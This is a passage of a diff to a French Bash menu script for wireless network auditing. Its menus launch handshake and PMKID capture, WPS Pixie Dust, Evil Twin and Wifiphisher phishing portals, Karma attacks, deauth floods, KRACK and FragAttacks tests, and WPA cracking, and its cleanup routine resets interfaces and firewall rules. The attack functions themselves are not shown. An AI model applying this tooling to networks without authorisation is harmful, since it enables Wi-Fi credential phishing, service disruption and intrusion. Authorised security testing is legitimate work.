+        echo "  [3] WPS Pixie Dust"
+        echo "  [4] Wifite automatisé"
+        echo "  [0] Retour"
+        read -rp "Choix : " o
+        case "$o" in
+            1) capture_handshake ;; 2) capture_pmkid ;; 3) wps_attack ;;
+            4) run_wifite ;; 0) break ;; *) err "Invalide."; pause ;;
+        esac
+    done
+}
+
+submenu_advanced() {
+    while true; do
+        draw_header
+        echo -e "${BOLD}${RED}=== ATTAQUES AVANCÉES ===${NC}\n"
+        echo "  [1] Evil Twin classique (Airbase-ng + Portal)"
+        echo "  [2] Evil Twin Wifiphisher (Phishing auto)"
+        echo "  [3] Karma Attack (MANA)"
+        echo "  [4] Détection Rogue AP"
+        echo "  [5] Stress Test (Deauth flood)"
+        echo "  [0] Retour"
+        read -rp "Choix : " o
+        case "$o" in
+            1) evil_twin_classic ;; 2) evil_twin_wifiphisher ;; 3) karma_attack ;;
+            4) detect_rogue_ap ;; 5) stress_test_deauth ;; 0) break ;;
+            *) err "Invalide."; pause ;;
+        esac
+    done
+}
+
+submenu_robustness() {
+    while true; do
+        draw_header
+        echo -e "${BOLD}=== TESTS DE ROBUSTESSE ===${NC}\n"
+        echo "  [1] Test KRACK (Key Reinstallation)"
+        echo "  [2] Test FragAttacks (Fragmentation)"
+        echo "  [3] Test injection de paquets"
+        echo "  [4] Vérifier PMF (802.11w)"
+        echo "  [0] Retour"
+        read -rp "Choix : " o
+        case "$o" in
+            1) krack_test ;; 2) fragattacks_test ;; 3) test_injection ;;
+            4) stress_test_deauth ;; 0) break ;; *) err "Invalide."; pause ;;
         esac
     done
 }
@@ -872,77 +1204,97 @@ submenu_attacks() {
 submenu_cracking() {
     while true; do
         draw_header
-        echo -e "${BOLD}=== CRACKING & ANALYSE DE CAPTURES ===${NC}\n"
-        echo "  [1] Vérifier la présence d'un handshake dans un fichier .cap"
-        echo "  [2] Cracker un handshake WPA/WPA2 avec dictionnaire"
-        echo "  [0] Retour au menu principal"
-        echo ""
-        read -rp "Choix : " opt
-        case "$opt" in
-            1) verify_handshake ;;
-            2) crack_handshake ;;
-            0|r|R) break ;;
-            *) err "Option invalide."; pause ;;
+        echo -e "${BOLD}=== CRACKING & ANALYSE ===${NC}\n"
+        echo "  [1] Vérifier handshake dans .cap"
+        echo "  [2] Cracker handshake WPA (aircrack-ng)"
+        echo "  [3] Cracker PMKID (hashcat / aircrack)"
+        echo "  [0] Retour"
+        read -rp "Choix : " o
+        case "$o" in
+            1) verify_handshake ;; 2) crack_handshake ;; 3) crack_pmkid ;;
+            0) break ;; *) err "Invalide."; pause ;;
         esac
     done
 }
 
 # ==============================
-# MENU PRINCIPAL & GESTION EXIT
+# CLEANUP GLOBAL
 # ==============================
 cleanup_on_exit() {
-    echo ""
-    log "Nettoyage avant fermeture..."
-    # Nettoie les processus résiduels de scan si existants
-    pkill -f "airodump-ng.*$SCAN_CSV_PREFIX" 2>/dev/null || true
+    echo -e "\n${YELLOW}[*] Nettoyage final...${NC}"
+    
+    pkill -f "airodump-ng" 2>/dev/null || true
+    pkill -f "aireplay-ng" 2>/dev/null || true
+    pkill -f "reaver" 2>/dev/null || true
+    pkill -f "airbase-ng" 2>/dev/null || true
+    pkill -f "hcxdumptool" 2>/dev/null || true
+    [[ -n "$EVIL_TWIN_PID" ]] && kill "$EVIL_TWIN_PID" 2>/dev/null || true
+
+    if [[ -n "$MONIFACE" ]]; then
+        airmon-ng stop "$MONIFACE" >/dev/null 2>&1 || true
+        [[ -n "$IFACE" ]] && {
+            ip link set "$IFACE" down 2>/dev/null || true
+            iw "$IFACE" set type managed 2>/dev/null || true
+            ip link set "$IFACE" up 2>/dev/null || true
+        }
+    fi
+
+    systemctl restart NetworkManager 2>/dev/null || service NetworkManager restart 2>/dev/null || true
+    systemctl restart wpa_supplicant 2>/dev/null || true
+    iptables -t nat -F 2>/dev/null || true
+    echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true
+    
+    ok "Système restauré. Logs : $LOGDIR"
 }
 
-trap cleanup_on_exit EXIT
+trap cleanup_on_exit EXIT INT TERM
 
+# ==============================
+# MENU PRINCIPAL
+# ==============================
 main_menu() {
     while true; do
         draw_header
         echo -e "${BOLD}=== MENU PRINCIPAL ===${NC}\n"
-        echo "  [1] 📡 Gestion Interface & Mode Monitor"
-        echo "  [2] 🔍 Scanner & Sélectionner un Réseau Cible (Auto)"
-        echo "  [3] 🎯 Actions d'Audit & Captures sur la Cible"
-        echo "  [4] 🔑 Cracking & Analyse de Fichiers (.cap / PMKID)"
-        echo "  [5] 📦 Vérifier / Installer les dépendances"
-        echo "  [6] 🔄 Désactiver le mode monitor & Restaurer le Réseau"
-        echo "  [0] 🚪 Quitter le programme"
+        echo "  [1] 📡 Gestion Interface & Monitor"
+        echo "  [2] 🔍 Scanner & Sélectionner une Cible"
+        echo "  [3] 🎯 Captures Classiques (Handshake/PMKID/WPS)"
+        echo "  [4] 👻 ${RED}Attaques Avancées (Evil Twin/Karma)${NC}"
+        echo "  [5] 🔑 Cracking & Analyse"
+        echo "  [6] 🛡️ Tests de Robustesse (KRACK/FragAttacks)"
+        echo "  [7] 📦 Vérifier / Installer dépendances"
+        echo "  [8] 🔄 Restaurer le réseau"
+        echo "  [0] 🚪 Quitter"
         echo ""
-        read -rp "Sélectionnez une option [0-6] : " main_choice
+        read -rp "Sélection [0-8] : " m
 
-        case "$main_choice" in
+        case "$m" in
             1) submenu_interfaces ;;
             2) scan_and_select_target ;;
             3) submenu_attacks ;;
-            4) submenu_cracking ;;
-            5) check_deps ;;
-            6) disable_monitor ;;
+            4) submenu_advanced ;;
+            5) submenu_cracking ;;
+            6) submenu_robustness ;;
+            7) check_deps ;;
+            8) disable_monitor ;;
             0|q|Q)
-                draw_header
                 if [[ -n "$MONIFACE" ]]; then
-                    read -rp "Voulez-vous désactiver le mode monitor avant de quitter ? (o/n) [défaut: o] : " stop_mon
-                    stop_mon="${stop_mon:-o}"
-                    if [[ "$stop_mon" =~ ^[oOyY]$ ]]; then
-                        disable_monitor
-                    fi
+                    read -rp "Désactiver mode monitor avant de quitter ? (o/n) : " s
+                    [[ "$s" =~ ^[oOyY]$ ]] && disable_monitor
                 fi
-                ok "Session terminée. Logs sauvegardés dans : $LOGDIR"
+                ok "Au revoir. Logs : $LOGDIR"
                 exit 0
                 ;;
-            *)
-                err "Option invalide."
-                sleep 1
-                ;;
+            *) err "Invalide."; sleep 1 ;;
         esac
     done
 }
 
 # ==============================
-# POINT D'ENTRÉE DU SCRIPT
+# POINT D'ENTRÉE
 # ==============================
 check_root
 check_consent
+check_update
+load_session
 main_menu
